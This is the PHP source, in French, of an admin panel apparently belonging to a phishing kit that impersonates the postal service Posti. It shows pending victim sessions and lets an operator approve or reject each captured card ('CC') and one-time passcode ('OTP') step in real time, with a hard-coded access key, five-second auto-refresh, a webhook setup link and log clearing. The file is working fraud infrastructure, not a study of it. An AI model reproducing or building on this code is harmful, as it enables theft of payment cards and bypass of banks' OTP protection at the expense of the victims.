<?php
/**
 * Admin Panel - Manual Approval System
 * Access: admin/admin.php?key=YOUR_ADMIN_KEY
 * Approve: admin/admin.php?key=YOUR_ADMIN_KEY&action=approve&session=SESSION_ID&type=cc
 * Reject: admin/admin.php?key=YOUR_ADMIN_KEY&action=reject&session=SESSION_ID&type=otp
 */

// Admin key for security - CHANGE THIS!
$adminKey = 'Passe120.';

// Check admin key
if (!isset($_GET['key']) || $_GET['key'] !== $adminKey) {
    http_response_code(403);
    die('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>403</title></head><body style="font-family:Arial;text-align:center;padding:50px;"><h1>403 Forbidden</h1><p>Access Denied</p></body></html>');
}

// Path to parent directory (where status folder is)
$parentDir = dirname(__DIR__);
$statusDir = $parentDir . '/status';
$logsDir = $parentDir . '/logs';

if (!is_dir($statusDir)) {
    mkdir($statusDir, 0755, true);
}
if (!is_dir($logsDir)) {
    mkdir($logsDir, 0755, true);
}

// Handle actions
if (isset($_GET['action']) && isset($_GET['session']) && isset($_GET['type'])) {
    $action = $_GET['action'];
    $sessionId = preg_replace('/[^a-f0-9]/i', '', $_GET['session']);
    $type = $_GET['type'];

    // Validation améliorée
    if (in_array($action, ['approve', 'reject']) && in_array($type, ['cc', 'otp']) && !empty($sessionId)) {
        
        $status = "{$action}d_{$type}"; // approved_cc, rejected_cc, approved_otp, rejected_otp
        
        // Vérifier si le fichier de session existe
        $sessionFile = "$statusDir/$sessionId.txt";
        
        // Créer ou mettre à jour le statut
        $result = file_put_contents($sessionFile, $status);

        // Log action avec plus de détails
        $logData = date('Y-m-d H:i:s') . " | Admin Action | Action: $action | Type: $type | Session: $sessionId | Result: " . ($result !== false ? 'SUCCESS' : 'FAILED') . " | File: $sessionFile\n";
        @file_put_contents("$logsDir/admin_actions.log", $logData, FILE_APPEND | LOCK_EX);

        // Debug log
        @file_put_contents("$logsDir/debug.log", 
            date('Y-m-d H:i:s') . " | DEBUG | Action: $action | Type: $type | Session: $sessionId | Status written: $status | File exists: " . (file_exists($sessionFile) ? 'YES' : 'NO') . "\n", 
            FILE_APPEND | LOCK_EX);

        // Return success page
        $color = $action === 'approve' ? '#27ae60' : '#e74c3c';
        $emoji = $action === 'approve' ? '✅' : '❌';
        $actionText = $action === 'approve' ? 'APPROUVÉ' : 'REFUSÉ';
        $typeText = $type === 'cc' ? 'Carte' : 'OTP';

        echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
        echo "<title>Action effectuée</title>";
        echo "<style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:Arial,sans-serif;background:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}";
        echo ".card{background:#16213e;border-radius:20px;padding:40px;text-align:center;max-width:400px;width:100%;border-left:5px solid $color;}";
        echo ".emoji{font-size:60px;margin-bottom:20px;}";
        echo ".title{color:$color;font-size:24px;font-weight:bold;margin-bottom:10px;}";
        echo ".info{color:#888;font-size:14px;margin-bottom:20px;}";
        echo ".session{background:#0f0f1a;padding:10px;border-radius:8px;font-family:monospace;font-size:12px;color:#666;margin-bottom:20px;word-break:break-all;}";
        echo ".debug{background:#ff000020;padding:10px;border-radius:8px;font-size:11px;color:#ff6b6b;margin-top:10px;text-align:left;}";
        echo ".btn{display:inline-block;background:#FF6200;color:#fff;padding:12px 30px;border-radius:25px;text-decoration:none;font-weight:bold;margin:5px;}</style></head>";
        echo "<body><div class='card'>";
        echo "<div class='emoji'>$emoji</div>";
        echo "<div class='title'>$typeText $actionText</div>";
        echo "<div class='info'>L'action a été effectuée avec succès</div>";
        echo "<div class='session'>Session: $sessionId</div>";
        echo "<div class='debug'>Status: $status<br>File: " . basename($sessionFile) . "<br>Result: " . ($result !== false ? 'OK' : 'FAIL') . "</div>";
        echo "<a href='admin.php?key=$adminKey' class='btn'>Panel Admin</a>";
        echo "<script>setTimeout(function(){window.location.href='admin.php?key=$adminKey';},2000);</script>";
        echo "</div></body></html>";
        exit;
    } else {
        // Log validation failure
        @file_put_contents("$logsDir/debug.log", 
            date('Y-m-d H:i:s') . " | VALIDATION FAILED | Action: $action | Type: $type | Session: $sessionId | Valid action: " . (in_array($action, ['approve', 'reject']) ? 'YES' : 'NO') . " | Valid type: " . (in_array($type, ['cc', 'otp']) ? 'YES' : 'NO') . "\n", 
            FILE_APPEND | LOCK_EX);
    }
}

// List all pending sessions
$sessions = [];
if (is_dir($statusDir)) {
    foreach (glob("$statusDir/*.txt") as $file) {
        $sessionId = basename($file, '.txt');
        $status = trim(file_get_contents($file));
        $sessions[] = [
            'id' => $sessionId,
            'status' => $status,
            'time' => filemtime($file)
        ];
    }
}

// Sort by time descending
usort($sessions, function($a, $b) {
    return $b['time'] - $a['time'];
});
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Posti</title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0;}
        body{font-family:Arial,sans-serif;background:#1a1a2e;color:#fff;padding:20px;min-height:100vh;}
        h1{text-align:center;margin-bottom:30px;color:#FF6200;}
        .container{max-width:900px;margin:0 auto;}
        .session{background:#16213e;border-radius:12px;padding:20px;margin-bottom:15px;border-left:4px solid #FF6200;}
        .session.pending{border-left-color:#f39c12;}
        .session.approved{border-left-color:#27ae60;}
        .session.rejected{border-left-color:#e74c3c;}
        .session-header{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;}
        .session-id{font-family:monospace;font-size:14px;color:#888;word-break:break-all;}
        .session-status{padding:5px 12px;border-radius:20px;font-size:12px;font-weight:bold;}
        .status-pending{background:#f39c12;color:#000;}
        .status-approved{background:#27ae60;color:#fff;}
        .status-rejected{background:#e74c3c;color:#fff;}
        .actions{margin-top:15px;display:flex;gap:10px;flex-wrap:wrap;}
        .btn{padding:10px 20px;border:none;border-radius:8px;font-weight:bold;cursor:pointer;text-decoration:none;font-size:14px;display:inline-block;transition:opacity 0.2s;}
        .btn-approve{background:#27ae60;color:#fff;}
        .btn-reject{background:#e74c3c;color:#fff;}
        .btn:hover{opacity:0.8;}
        .btn:active{transform:scale(0.98);}
        .time{font-size:12px;color:#666;margin-top:10px;}
        .empty{text-align:center;padding:50px;color:#666;background:#16213e;border-radius:12px;}
        .refresh{display:block;text-align:center;margin:20px auto;padding:15px 30px;background:#FF6200;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;text-decoration:none;}
        .stats{display:flex;justify-content:center;gap:20px;margin-bottom:30px;flex-wrap:wrap;}
        .stat{background:#16213e;padding:15px 25px;border-radius:10px;text-align:center;min-width:100px;}
        .stat-num{font-size:24px;font-weight:bold;color:#FF6200;}
        .stat-label{font-size:12px;color:#888;}
        .nav{display:flex;justify-content:center;gap:10px;margin-bottom:30px;flex-wrap:wrap;}
        .nav a{padding:10px 20px;background:#16213e;color:#fff;text-decoration:none;border-radius:8px;font-size:14px;}
        .nav a:hover{background:#FF6200;}
        .alert{background:#ff6b6b;color:#fff;padding:15px;border-radius:8px;margin-bottom:20px;text-align:center;}
        @media(max-width:600px){
            .session{padding:15px;}
            .actions{flex-direction:column;}
            .btn{width:100%;text-align:center;}
            .stats{gap:10px;}
            .stat{padding:12px 20px;min-width:80px;}
            .stat-num{font-size:20px;}
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎛️ Panel Admin - Posti</h1>

        <div class="nav">
            <a href="setup_webhook.php?key=<?php echo $adminKey; ?>">⚙️ Webhook Setup</a>
            <a href="admin.php?key=<?php echo $adminKey; ?>">🔄 Actualiser</a>
            <a href="?key=<?php echo $adminKey; ?>&clear_logs=1" onclick="return confirm('Effacer tous les logs ?')">🗑️ Effacer Logs</a>
        </div>

        <?php
        // Clear logs if requested
        if (isset($_GET['clear_logs'])) {
            @unlink("$logsDir/debug.log");
            @unlink("$logsDir/admin_actions.log");
            echo '<div class="alert">✅ Logs effacés avec succès</div>';
        }

        $pending = count(array_filter($sessions, fn($s) => strpos($s['status'], 'pending') !== false));
        $approved = count(array_filter($sessions, fn($s) => strpos($s['status'], 'approved') !== false));
        $rejected = count(array_filter($sessions, fn($s) => strpos($s['status'], 'rejected') !== false));
        ?>

        <div class="stats">
            <div class="stat">
                <div class="stat-num"><?php echo $pending; ?></div>
                <div class="stat-label">En attente</div>
            </div>
            <div class="stat">
                <div class="stat-num"><?php echo $approved; ?></div>
                <div class="stat-label">Approuvés</div>
            </div>
            <div class="stat">
                <div class="stat-num"><?php echo $rejected; ?></div>
                <div class="stat-label">Refusés</div>
            </div>
        </div>

        <?php if (empty($sessions)): ?>
            <div class="empty">
                <p style="font-size:40px;margin-bottom:15px;">📭</p>
                <p>Aucune session active</p>
            </div>
        <?php else: ?>
            <?php foreach ($sessions as $session): ?>
                <?php
                $statusClass = 'pending';
                if (strpos($session['status'], 'approved') !== false) $statusClass = 'approved';
                if (strpos($session['status'], 'rejected') !== false) $statusClass = 'rejected';

                $isPending = strpos($session['status'], 'pending') !== false;
                $currentType = strpos($session['status'], '_cc') !== false ? 'cc' :
                              (strpos($session['status'], '_otp') !== false ? 'otp' : 'cc');
                ?>
                <div class="session <?php echo $statusClass; ?>">
                    <div class="session-header">
                        <span class="session-id">🔖 <?php echo $session['id']; ?></span>
                        <span class="session-status status-<?php echo $statusClass; ?>">
                            <?php echo strtoupper(str_replace('_', ' ', $session['status'])); ?>
                        </span>
                    </div>

                    <?php if ($isPending): ?>
                    <div class="actions">
                        <?php if ($currentType === 'cc' || strpos($session['status'], 'pending_cc') !== false): ?>
                        <a href="admin.php?key=<?php echo $adminKey; ?>&action=approve&session=<?php echo $session['id']; ?>&type=cc" class="btn btn-approve">✅ Approuver CC</a>
                        <a href="admin.php?key=<?php echo $adminKey; ?>&action=reject&session=<?php echo $session['id']; ?>&type=cc" class="btn btn-reject">❌ Refuser CC</a>
                        <?php endif; ?>
                        <?php if ($currentType === 'otp' || strpos($session['status'], 'pending_otp') !== false): ?>
                        <a href="admin.php?key=<?php echo $adminKey; ?>&action=approve&session=<?php echo $session['id']; ?>&type=otp" class="btn btn-approve">✅ Approuver OTP</a>
                        <a href="admin.php?key=<?php echo $adminKey; ?>&action=reject&session=<?php echo $session['id']; ?>&type=otp" class="btn btn-reject">❌ Refuser OTP</a>
                        <?php endif; ?>
                    </div>
                    <?php endif; ?>

                    <div class="time">
                        ⏰ <?php echo date('d/m/Y H:i:s', $session['time']); ?>
                    </div>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>

        <a href="admin.php?key=<?php echo $adminKey; ?>" class="refresh">🔄 Actualiser</a>
        
        <?php if (file_exists("$logsDir/debug.log")): ?>
        <div style="margin-top:30px;background:#16213e;padding:20px;border-radius:12px;">
            <h3 style="color:#FF6200;margin-bottom:10px;">📋 Debug Logs (dernières 10 lignes)</h3>
            <pre style="background:#0f0f1a;padding:15px;border-radius:8px;overflow-x:auto;font-size:11px;color:#888;"><?php
                $debugContent = file_get_contents("$logsDir/debug.log");
                $lines = explode("\n", trim($debugContent));
                echo htmlspecialchars(implode("\n", array_slice($lines, -10)));
            ?></pre>
        </div>
        <?php endif; ?>
    </div>

    <script>
        // Auto-refresh every 5 seconds
        setTimeout(function() {
            location.reload();
        }, 5000);
        
        // Confirm before reject
        document.querySelectorAll('.btn-reject').forEach(function(btn) {
            btn.addEventListener('click', function(e) {
                if (!confirm('Êtes-vous sûr de vouloir REFUSER cette transaction ?')) {
                    e.preventDefault();
                }
            });
        });
    </script>
</body>
</html>